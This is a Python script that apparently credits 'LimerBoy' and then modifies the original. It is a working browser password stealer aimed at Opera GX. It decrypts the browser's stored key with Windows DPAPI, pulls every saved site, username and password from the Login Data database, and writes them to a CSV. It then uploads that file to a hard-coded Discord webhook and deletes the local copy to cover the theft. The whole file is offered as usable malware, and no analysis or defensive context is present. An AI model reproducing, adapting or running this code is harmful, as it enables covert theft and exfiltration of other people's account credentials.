# Full Credits to LimerBoy + Modifications by FalconTheBerd
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests  # For sending data to the webhook

# GLOBAL CONSTANT
OPERA_GX_PATH_LOCAL_STATE = os.path.normpath(r"%APPDATA%\Opera Software\Opera GX Stable\Local State")
OPERA_GX_PATH = os.path.normpath(r"%APPDATA%\Opera Software\Opera GX Stable")

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1315470655214456853/l0scZup7vlAfr5fJ7xB_Wtl4UPAX5c23vS7shFhAFWYUKCoHA8sMbMdJFB1ReqSUQNw1"

def get_secret_key():
    try:
        with open(OPERA_GX_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Opera GX secret key cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Opera GX version <80 not supported. Please check.")
        return ""

def get_db_connection(opera_path_login_db):
    try:
        shutil.copy2(opera_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Opera GX database cannot be found")
        return None

def send_to_discord(file_path):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                DISCORD_WEBHOOK_URL,
                files={"file": file}
            )
        if response.status_code == 204:
            print("[INFO] File sent to Discord successfully.")
        else:
            print(f"[ERR] Failed to send file to Discord. Status code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Failed to send file to Discord: {str(e)}")

if __name__ == '__main__':
    try:
        csv_file_path = 'decrypted_password.csv'
        with open(csv_file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            secret_key = get_secret_key()
            opera_path_login_db = os.path.normpath(r"%s\Login Data" % OPERA_GX_PATH)
            conn = get_db_connection(opera_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print("Sequence: %d" % (index))
                        print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password))
                        print("*" * 50)
                        csv_writer.writerow([index, url, username, decrypted_password])
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        send_to_discord(csv_file_path)
        os.remove(csv_file_path)
    except Exception as e:
        print("[ERR] %s" % str(e))
